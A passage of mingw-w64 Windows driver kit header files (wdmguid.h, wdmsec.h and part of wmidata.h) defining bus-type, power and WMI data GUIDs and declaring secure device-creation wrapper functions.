DEFINE_GUID(GUID_BUS_TYPE_SERENUM,
  0x77114a87, 0x8944, 0x11d1, 0xbd, 0x90, 0x00, 0xa0, 0xc9, 0x06, 0xbe, 0x2d);
DEFINE_GUID(GUID_BUS_TYPE_USB,
  0x9d7debbc, 0xc85d, 0x11d1, 0x9e, 0xb4, 0x00, 0x60, 0x08, 0xc3, 0xa1, 0x9a);
DEFINE_GUID(GUID_BUS_TYPE_1394,
  0xf74e73eb, 0x9ac5, 0x45eb, 0xbe, 0x4d, 0x77, 0x2c, 0xc7, 0x1d, 0xdf, 0xb3);
DEFINE_GUID(GUID_BUS_TYPE_HID,
  0xeeaf37d0, 0x1963, 0x47c4, 0xaa, 0x48, 0x72, 0x47, 0x6d, 0xb7, 0xcf, 0x49);
DEFINE_GUID(GUID_BUS_TYPE_AVC,
  0xc06ff265, 0xae09, 0x48f0, 0x81, 0x2c, 0x16, 0x75, 0x3d, 0x7c, 0xba, 0x83);
DEFINE_GUID(GUID_BUS_TYPE_IRDA,
  0x7ae17dc1, 0xc944, 0x44d6, 0x88, 0x1f, 0x4c, 0x2e, 0x61, 0x05, 0x3b, 0xc1);
DEFINE_GUID(GUID_BUS_TYPE_SD,
  0xe700cc04, 0x4036, 0x4e89, 0x95, 0x79, 0x89, 0xeb, 0xf4, 0x5f, 0x00, 0xcd);

DEFINE_GUID(GUID_POWER_DEVICE_ENABLE,
  0x827c0a6fL, 0xfeb0, 0x11d0, 0xbd, 0x26, 0x00, 0xaa, 0x00, 0xb7, 0xb3, 0x2a);
DEFINE_GUID(GUID_POWER_DEVICE_TIMEOUTS,
  0xa45da735L, 0xfeb0, 0x11d0, 0xbd, 0x26, 0x00, 0xaa, 0x00, 0xb7, 0xb3, 0x2a);
DEFINE_GUID(GUID_POWER_DEVICE_WAKE_ENABLE,
  0xa9546a82L, 0xfeb0, 0x11d0, 0xbd, 0x26, 0x00, 0xaa, 0x00, 0xb7, 0xb3, 0x2a);

#endif /* __WDMGUID_H */

```

`include/ddk/wdmsec.h`:

```h
/**
 * This file has no copyright assigned and is placed in the Public Domain.
 * This file is part of the mingw-w64 runtime package.
 * No warranty is given; refer to the file DISCLAIMER.PD within this package.
 */

#ifndef _WDMSEC_H_
#define _WDMSEC_H_

#ifdef __cplusplus
extern "C" {
#endif

extern const UNICODE_STRING SDDL_DEVOBJ_KERNEL_ONLY;
#define SDDL_DEVOBJ_INF_SUPPLIED SDDL_DEVOBJ_KERNEL_ONLY

extern const UNICODE_STRING SDDL_DEVOBJ_SYS_ALL;
extern const UNICODE_STRING SDDL_DEVOBJ_SYS_ALL_ADM_ALL;
extern const UNICODE_STRING SDDL_DEVOBJ_SYS_ALL_ADM_RX;
extern const UNICODE_STRING SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_R;
extern const UNICODE_STRING SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_R_RES_R;
extern const UNICODE_STRING SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_RW_RES_R;
extern const UNICODE_STRING SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_RWX_RES_RWX;

#undef IoCreateDeviceSecure
#define IoCreateDeviceSecure WdmlibIoCreateDeviceSecure

NTSTATUS
WdmlibIoCreateDeviceSecure(
  PDRIVER_OBJECT DriverObject,
  ULONG DeviceExtensionSize,
  PUNICODE_STRING DeviceName,
  DEVICE_TYPE DeviceType,
  ULONG DeviceCharacteristics,
  BOOLEAN Exclusive,
  PCUNICODE_STRING DefaultSDDLString,
  LPCGUID DeviceClassGuid,
  PDEVICE_OBJECT *DeviceObject
);

#undef RtlInitUnicodeStringEx
#define RtlInitUnicodeStringEx WdmlibRtlInitUnicodeStringEx

NTSTATUS
WdmlibRtlInitUnicodeStringEx(
  PUNICODE_STRING DestinationString,
  PCWSTR SourceString
);

#undef IoValidateDeviceIoControlAccess
#define IoValidateDeviceIoControlAccess WdmlibIoValidateDeviceIoControlAccess

NTSTATUS
WdmlibIoValidateDeviceIoControlAccess(
  PIRP Irp,
  ULONG RequiredAccess
);

#ifdef __cplusplus
}
#endif

#endif /* _WDMSEC_H_ */

```

`include/ddk/wmidata.h`:

```h
#pragma once

#define AGP_WMI_STD_DATA_GUID {0x8c27fbed,0x1c7b,0x47e4, {0xa6,0x49,0x0e,0x38,0x9d,0x3a,0xda,0x4f}}
#define DATA_PROVIDER_PNPID_GUID {0xc7bf35d2,0xaadb,0x11d1, {0xbf,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define DATA_PROVIDER_PNPID_INSTANCE_NAMES_GUID {0xc7bf35d3,0xaadb,0x11d1, {0xbf,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define DEVICE_UI_FIRMWARE_REVISION_GUID {0x4504b1d4,0xc5ee,0x4df6, {0x95,0x1f,0x16,0x18,0x0e,0x3d,0xd8,0x15}}
#define FrequencyRangeDescriptorGuid {0xf4546078,0xf3b2,0x417e, {0x94,0xcd,0x47,0xea,0x30,0x6c,0x57,0x51}}
#define GUID_REDBOOK_WMI_PERF_DATA {0xb90550e8,0xae0a,0x11d1, {0xa5,0x71,0x00,0xc0,0x4f,0xa3,0x47,0x30}}
#define GUID_REDBOOK_WMI_STD_DATA {0xb90550e7,0xae0a,0x11d1, {0xa5,0x71,0x00,0xc0,0x4f,0xa3,0x47,0x30}}
#define IdleAccountingExGuid {0xd67abd39,0x81f8,0x4a5e, {0x81,0x52,0x72,0xe3,0x1e,0xc9,0x12,0xee}}
#define IdleAccountingGuid {0xe2a26f78,0xae07,0x4ee0, {0xa3,0x0f,0xce,0x35,0x4f,0x5a,0x94,0xcd}}
#define IdleStateAccountingExGuid {0x3e0d7b2c,0x401b,0x480f, {0x83,0x03,0xd0,0xc2,0x0e,0xa1,0xa7,0xd8}}
#define IdleStateAccountingGuid {0x5280028a,0xc24f,0x43ec, {0xb2,0x7d,0xa9,0x60,0xa7,0x0e,0x31,0x9a}}
#define IdleStateBucketExGuid {0xe53e0a7d,0x36f0,0x4a77, {0x87,0x9e,0x9c,0x6b,0x5e,0x4a,0x85,0x54}}
#define KEYBOARD_PORT_WMI_EXTENDED_ID {0x6ac4e23d,0xa950,0x4518, {0x8b,0x2b,0xaa,0x4d,0xcd,0x5f,0xe1,0x4a}}
#define KEYBOARD_PORT_WMI_STD_DATA_GUID {0x4731f89a,0x71cb,0x11d1, {0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define KernelIdleStateChangeGuid {0x4838fe4f,0xf71c,0x4e51, {0x9e,0xcc,0x84,0x30,0xa7,0xac,0x4c,0x6c}}
#define KernelIdleStateGuid {0x46bdcf4a,0xe076,0x4550, {0x82,0xb2,0x9f,0x32,0xed,0xed,0x3e,0x7f}}
#define KernelIdleStatesGuid {0xba138e10,0xe250,0x4ad7, {0x86,0x16,0xcf,0x1a,0x7a,0xd4,0x10,0xe7}}
#define KernelPerfStateChangeGuid {0xa5b32ddd,0x7f39,0x4abc, {0xb8,0x92,0x90,0x0e,0x43,0xb5,0x9e,0xbb}}
#define KernelPerfStateDomainChangeGuid {0x995e6b7f,0xd653,0x497a, {0xb9,0x78,0x36,0xa3,0x0c,0x29,0xbf,0x01}}
#define KernelPerfStateGuid {0x8c7980e1,0xf62b,0x419e, {0xaa,0x82,0x27,0x6c,0x8d,0x06,0x4a,0x1f}}
#define KernelPerfStatesGuid {0x5708cc20,0x7d40,0x4bf4, {0xb4,0xaa,0x2b,0x01,0x33,0x8d,0x01,0x26}}
#define KernelThermalConstraintChangeGuid {0xa852c2c8,0x1a4c,0x423b, {0x8c,0x2c,0xf3,0x0d,0x82,0x93,0x1a,0x88}}
#define KernelThermalPolicyChangeGuid {0xaca5a8f7,0x96ca,0x4397, {0xba,0xde,0x43,0xbe,0x2f,0x57,0x7d,0x51}}
#define MSAcpiInfoGuid {0x5daf38ae,0xf6f8,0x4d90, {0x81,0x99,0xeb,0xde,0x68,0x00,0xec,0x3b}}
#define MSAcpi_ThermalZoneTemperatureGuid {0xa1bc18c0,0xa7c8,0x11d1, {0xbf,0x3c,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSDiskDriver_GeometryGuid {0x25007f51,0x57c2,0x11d1, {0xa5,0x28,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSDiskDriver_PerformanceDataGuid {0xbdd865d2,0xd7c1,0x11d0, {0xa5,0x01,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSDiskDriver_PerformanceGuid {0xbdd865d1,0xd7c1,0x11d0, {0xa5,0x01,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSIde_PortDeviceInfoGuid {0x53f5630f,0xb6bf,0x11d0, {0x94,0xf2,0x00,0xa0,0xc9,0x1e,0xfb,0x8b}}
#define MSKeyboard_ClassInformationGuid {0x4731f899,0x71cb,0x11d1, {0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSMCAEvent_BusErrorGuid {0x1ee17050,0x0039,0x40f7, {0x9e,0xad,0x14,0xad,0x51,0x61,0x2c,0xb2}}
#define MSMCAEvent_CPUErrorGuid {0x5ce27cde,0xd179,0x4c68, {0x93,0x7f,0xa0,0x7b,0x8c,0xc2,0xea,0x39}}
#define MSMCAEvent_HeaderGuid {0x6381c27f,0xc8fa,0x4da7, {0x89,0x53,0xb8,0x68,0x33,0x73,0x6e,0x15}}
#define MSMCAEvent_InvalidErrorGuid {0x477b769b,0x785c,0x48dd, {0xa0,0x2e,0x57,0xe0,0x51,0xbe,0x7b,0x85}}
#define MSMCAEvent_MemoryErrorGuid {0x433eea38,0xc1a7,0x48f1, {0x88,0x4f,0xb6,0x87,0x5f,0x17,0x6c,0xc7}}
#define MSMCAEvent_MemoryHierarchyErrorGuid {0xcede75a0,0xa77f,0x452b, {0x8f,0x2f,0x54,0x1f,0x92,0x6d,0xb0,0xf9}}
#define MSMCAEvent_MemoryPageRemovedGuid {0x84e9ddb6,0xe233,0x4dfc, {0x98,0x8c,0x74,0x12,0xc8,0x75,0x4f,0xec}}
#define MSMCAEvent_PCIBusErrorGuid {0xa14a5594,0x25de,0x410e, {0x9b,0x92,0x80,0xf0,0x80,0x1a,0xec,0x07}}
#define MSMCAEvent_PCIComponentErrorGuid {0x805caf4e,0x336c,0x4eb2, {0x8c,0x0c,0x02,0xf3,0x51,0xcb,0xf1,0x3c}}
#define MSMCAEvent_PlatformSpecificErrorGuid {0x2d2434aa,0xef83,0x4200, {0xba,0x24,0xde,0x36,0x6c,0x41,0x5f,0x7b}}
#define MSMCAEvent_SMBIOSErrorGuid {0x4184df1b,0xedfe,0x406b, {0xb1,0x72,0x54,0xc9,0x1f,0xbd,0x9b,0xaf}}
#define MSMCAEvent_SwitchToCMCPollingGuid {0x39c14290,0xf036,0x4999, {0xb8,0xa1,0xb6,0xf8,0x71,0xfb,0x32,0x9e}}
#define MSMCAEvent_SwitchToCPEPollingGuid {0xd5c870ce,0x4ed0,0x4fdc, {0xbb,0x54,0x8b,0x45,0x2c,0x18,0x79,0x7e}}
#define MSMCAEvent_SystemEventErrorGuid {0xbdba4b12,0x8d00,0x4570, {0xb9,0xb2,0x3f,0xde,0xcf,0x1d,0x56,0x61}}
#define MSMCAEvent_TLBErrorGuid {0xb161eeab,0xac03,0x4c2b, {0xae,0x7a,0x5a,0x37,0x68,0xf7,0x0e,0x85}}
#define MSMCAInfo_EntryGuid {0x9e77a308,0x6b82,0x4fc1, {0xab,0x41,0x0a,0x55,0x86,0x7c,0x35,0xc2}}
#define MSMCAInfo_RawCMCEventGuid {0x2f1a8a9d,0x7988,0x457f, {0xa1,0x7a,0x89,0x79,0xe8,0x20,0x43,0xc5}}
#define MSMCAInfo_RawCorrectedPlatformEventGuid {0x6b629d5e,0xe63c,0x48a3, {0x9e,0xbb,0x97,0x42,0x27,0x07,0x52,0x65}}
#define MSMCAInfo_RawMCADataGuid {0x23602a8a,0xdadd,0x462f, {0x9a,0xe5,0x30,0xfa,0x2c,0x37,0xdd,0x5b}}
#define MSMCAInfo_RawMCAEventGuid {0x2f1a8a9f,0x7988,0x457f, {0xa1,0x7a,0x89,0x79,0xe8,0x20,0x43,0xc5}}
#define MSMouse_ClassInformationGuid {0x4731f89b,0x71cb,0x11d1, {0xa5,0x2c,0x00,0xa0,0xc9,0x06,0x29,0x10}}
#define MSNdis_80211_AddWEPGuid {0x4307bff0,0x2129,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_AuthenticationModeGuid {0x43920a24,0x2129,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_BSSIListGuid {0x69526f9a,0x2062,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_BaseServiceSetIdentifierGuid {0x2504b6c2,0x1fa5,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_BssIdListScanGuid {0x0d9e01e1,0xba70,0x11d4, {0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37}}
#define MSNdis_80211_ConfigurationFHGuid {0x4a800b8c,0x2068,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_ConfigurationGuid {0x4a4df982,0x2068,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_ConfigurationInfoGuid {0x220c16fc,0xb9a8,0x11d4, {0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37}}
#define MSNdis_80211_DataRatesGuid {0x49db8722,0x2068,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_DesiredDataRatesGuid {0x452ee08e,0x2536,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_DisassociateGuid {0x43671f40,0x2129,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_FragmentationThresholdGuid {0x69aaa7c4,0x2062,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_InfrastructureModeGuid {0x697d5a7e,0x2062,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_NetworkInfrastructureGuid {0x34e1fa48,0xb9b6,0x11d4, {0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37}}
#define MSNdis_80211_NetworkTypeGuid {0xe779ab61,0xb9ab,0x11d4, {0xb6,0x75,0x00,0x20,0x48,0x57,0x03,0x37}}
#define MSNdis_80211_NetworkTypeInUseGuid {0x857e2326,0x2041,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_NetworkTypesSupportedGuid {0x8531d6e6,0x2041,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_NumberOfAntennasGuid {0x01779336,0x2064,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_PowerModeGuid {0x85be837c,0x2041,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_PrivacyFilterGuid {0x6733c4e9,0x4792,0x11d4, {0x97,0xf1,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_RTSThresholdGuid {0x0134d07e,0x2064,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_ReceiveAntennaSelectedGuid {0x01ac07a2,0x2064,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_ReceivedSignalStrengthEventTriggerGuid {0x155689b8,0x2053,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_ReceivedSignalStrengthGuid {0x1507db16,0x2053,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_ReloadDefaultsGuid {0x748b14e8,0x32ee,0x4425, {0xb9,0x1b,0xc9,0x84,0x8c,0x58,0xb5,0x5a}}
#define MSNdis_80211_RemoveWEPGuid {0x433c345c,0x2129,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_ServiceSetIdentifierGuid {0x7d2a90ea,0x2041,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_StatisticsGuid {0x42bb73b0,0x2129,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_TransmitAntennaSelectedGuid {0x01dbb74a,0x2064,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_TransmitPowerLevelGuid {0x11e6ba76,0x2053,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_80211_WEPStatusGuid {0xb027a21f,0x3cfa,0x4125, {0x80,0x0b,0x3f,0x7a,0x18,0xfd,0xdc,0xdc}}
#define MSNdis_80211_WLanBssIdGuid {0x6929e718,0x2062,0x11d4, {0x97,0xeb,0x00,0xc0,0x4f,0x79,0xc4,0x03}}
#define MSNdis_AtmHardwareCurrentAddressGuid {0x791ad1a1,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmMaxAal0PacketSizeGuid {0x791ad1a5,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmMaxAal1PacketSizeGuid {0x791ad1a6,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmMaxAal34PacketSizeGuid {0x791ad1a7,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmMaxAal5PacketSizeGuid {0x791ad191,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmMaxActiveVciBitsGuid {0x791ad1a3,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmMaxActiveVcsGuid {0x791ad1a2,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmMaxActiveVpiBitsGuid {0x791ad1a4,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmReceiveCellsDroppedGuid {0x0a21480c,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmReceiveCellsOkGuid {0x0a21480a,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmSupportedAalTypesGuid {0x791ad1a0,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmSupportedServiceCategoryGuid {0x791ad19f,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmSupportedVcRatesGuid {0x791ad19e,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_AtmTransmitCellsOkGuid {0x0a21480b,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoDriverVersionGuid {0x791ad198,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoHardwareStatusGuid {0x791ad192,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoLinkSpeedGuid {0x791ad195,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoMacOptionsGuid {0x791ad19a,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoMediaConnectStatusGuid {0x791ad19b,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoMediaInUseGuid {0x791ad194,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoMediaSupportedGuid {0x791ad193,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoMinimumLinkSpeedGuid {0x791ad19d,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoReceivePduErrorsGuid {0x0a214808,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoReceivePdusNoBufferGuid {0x0a214809,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoReceivePdusOkGuid {0x0a214806,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoTransmitPduErrorsGuid {0x0a214807,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoTransmitPdusOkGuid {0x0a214805,0xe35f,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoVendorDescriptionGuid {0x791ad197,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoVendorDriverVersionGuid {0x791ad19c,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CoVendorIdGuid {0x791ad196,0xe35c,0x11d0, {0x96,0x92,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CountedStringGuid {0x146360a5,0x88dd,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_CurrentLookaheadGuid {0x5ec10361,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_CurrentPacketFilterGuid {0x5ec10360,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_DeviceWakeOnMagicPacketOnlyGuid {0xa14f1c97,0x8839,0x4f8a, {0x99,0x96,0xa2,0x89,0x96,0xeb,0xbf,0x1d}}
#define MSNdis_DriverVersionGuid {0x5ec10362,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EnumerateAdapterExGuid {0x16716917,0x4306,0x4be4, {0x9b,0x5a,0x38,0x09,0xae,0x44,0xb1,0x25}}
#define MSNdis_EnumerateAdapterGuid {0x981f2d7f,0xb1f3,0x11d0, {0x8d,0xd7,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EnumeratePortsGuid {0xf1d6abe8,0x15e4,0x4407, {0x81,0xb7,0x6b,0x83,0x0c,0x77,0x7c,0xd9}}
#define MSNdis_EnumerateReceiveFiltersGuid {0x3f2c141d,0x83bc,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_EnumerateReceiveQueuesGuid {0x3f2c141b,0x83bc,0x11dd, {0x94,0xb8,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_EthernetCurrentAddressGuid {0x44795700,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EthernetMacOptionsGuid {0x44795703,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EthernetMaximumMulticastListSizeGuid {0x44795702,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EthernetMoreTransmitCollisionsGuid {0x44795706,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EthernetMulticastListGuid {0x44795701,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EthernetOneTransmitCollisionGuid {0x44795705,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EthernetPermanentAddressGuid {0x447956ff,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_EthernetReceiveErrorAlignmentGuid {0x44795704,0xa61b,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiAttachmentTypeGuid {0xacf1403d,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiDownstreamNodeLongGuid {0xacf1403f,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiFrameErrorsGuid {0xacf14040,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiFramesLostGuid {0xacf14041,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiLConnectionStateGuid {0xacf14045,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiLctFailuresGuid {0xacf14043,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiLemRejectsGuid {0xacf14044,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiLongCurrentAddressGuid {0xacf14036,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiLongMaximumListSizeGuid {0xacf14038,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiLongMulticastListGuid {0xacf14037,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiLongPermanentAddressGuid {0xacf14035,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiRingManagmentStateGuid {0xacf14042,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiShortCurrentAddressGuid {0xacf1403a,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiShortMaximumListSizeGuid {0xacf1403c,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiShortMulticastListGuid {0xacf1403b,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiShortPermanentAddressGuid {0xacf14039,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_FddiUpstreamNodeLongGuid {0xacf1403e,0xa61c,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_GroupAffinityGuid {0xf786fbd5,0xc049,0x11dd, {0xb8,0x85,0x00,0x1d,0x09,0x16,0x2b,0xc3}}
#define MSNdis_HDSplitCurrentConfigGuid {0x81d1303c,0xab00,0x4e49, {0x80,0xb1,0x5e,0x6e,0x0b,0xf9,0xbe,0x53}}
#define MSNdis_HDSplitParametersGuid {0x1131c56a,0x0a5a,0x4d79, {0x8d,0xde,0x1e,0x6f,0x17,0x80,0x05,0xee}}
#define MSNdis_HardwareStatusGuid {0x5ec10354,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_InterruptModerationParametersGuid {0x09f58643,0x31fb,0x45b5, {0x85,0x2b,0x09,0xb4,0xd3,0xff,0x37,0x65}}
#define MSNdis_LinkParametersGuid {0x29380131,0xa312,0x4400, {0xbe,0x0c,0x53,0x87,0x7a,0x41,0xc4,0x65}}
#define MSNdis_LinkSpeedGuid {0x5ec10359,0xa61a,0x11d0, {0x8d,0xd4,0x00,0xc0,0x4f,0xc3,0x35,0x8c}}
#define MSNdis_LinkStateDataGuid {0x5b26b94f,0x0272,0x4d4c, {0x87,0x44,0xbd,0x84,0xbe,0x42,0x1f,0x3b}}
#define MSNdis_LinkStateGuid {0xba1f4c14,0xa945,0x4762, {0xb9,0x16,0x0b,0x55,0x15,0xb6,0xf4,0x3a}}
